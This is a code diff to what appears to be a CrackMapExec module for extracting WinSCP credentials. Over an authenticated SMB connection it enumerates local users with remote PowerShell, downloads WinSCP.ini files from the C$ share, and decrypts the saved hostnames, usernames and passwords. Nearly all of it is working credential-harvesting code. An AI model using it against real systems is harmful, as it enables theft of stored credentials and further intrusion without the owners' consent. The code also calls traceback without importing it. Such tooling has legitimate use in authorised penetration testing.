@@ -1,13 +1,19 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # If you are looking for a local Version, the baseline code is from https://github.com/NeffIsBack/WinSCPPasswdExtractor
+# References and inspiration:
+# - https://github.com/anoopengineer/winscppasswd
+# - https://github.com/dzxs/winscppassword
+# - https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/parser/winscp.rb
 
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5 import rrp
 from impacket.examples.secretsdump import RemoteOperations
 from impacket.smbconnection import SessionError
 from urllib.parse import unquote
+from io import BytesIO
 import re
+import configparser
 
 class CMEModule:
     '''
@@ -31,6 +37,7 @@ class CMEModule:
 
         self.PW_MAGIC = 0xA3
         self.PW_FLAG  = 0xFF
+        self.share = 'C$'
 
 
     # ==================== Helper ====================
@@ -318,10 +325,65 @@ class CMEModule:
             remoteOps.finish()
 
     # ==================== Handle Configs ====================
+    def decodeConfigFile(self, context, connection, confFile):
+        config = configparser.ConfigParser(strict=False)
+        config.read_string(confFile)
 
-    #def on_login(self, context, connection):
-    #    pass
+        # Stop extracting creds if Master Password is set
+        if (int(config.get('Configuration\\Security', 'UseMasterPassword')) == 1):
+            context.log.error("Master Password Set, unable to recover saved passwords!")
+            return
+
+        for section in config.sections():
+            if config.has_option(section, 'HostName'):
+                hostName = config.get(section, 'HostName')
+                userName = config.get(section, 'UserName')
+                if config.has_option(section, 'Password'):
+                    encPassword = config.get(section, 'Password')
+                    decPassword = self.decryptPasswd(context, hostName, userName, encPassword)
+                else:
+                    decPassword = "NO_PASSWORD_FOUND"
+                sectionName = unquote(section)
+                self.printCreds(context, [sectionName, hostName, userName, decPassword])
+
+    def getConfigFile(self, context, connection):
+        if self.filepath:
+            self.share = (self.filepath.split(':')[0] + "$")
+            path = self.filepath.split(':')[1]
+
+            try:
+                buf = BytesIO()
+                connection.conn.getFile(self.share, path, buf.write)
+                confFile = buf.getvalue().decode()
+                context.log.success("Found config file! Extracting credentials...")
+                self.decodeConfigFile(context, connection, confFile)
+            except:
+                context.log.error("Error! No config file found at {}".format(self.filepath))
+                traceback.print_exc()
+        else:
+            output = connection.execute('powershell.exe "Get-LocalUser | Select name"', True)
+            users = []
+            for row in output.split('\r\n'):
+                users.append(row.strip())
+            users = users[2:]
+            
+            # Iterate over found users and default paths to look for WinSCP.ini files
+            for user in users:
+                paths = [("\\Users\\" + user + "\\Documents\\WinSCP.ini"), \
+                        ("\\Users\\" + user + "\\AppData\\Roaming\\WinSCP.ini")]
+                for path in paths:
+                    confFile = ""
+                    try:
+                        buf = BytesIO()
+                        connection.conn.getFile(self.share, path, buf.write)
+                        confFile = buf.getvalue().decode()
+                        context.log.success("Found config file at \"{}\"! Extracting credentials...".format(self.share + path))
+                    except:
+                        context.log.debug("No config file found at \"{}\"".format(self.share + path))
+                    if confFile:
+                        self.decodeConfigFile(context, connection, confFile)
 
     def on_login(self, context, connection):
         self.registryDiscover(context, connection)
+        self.getConfigFile(context, connection)
 
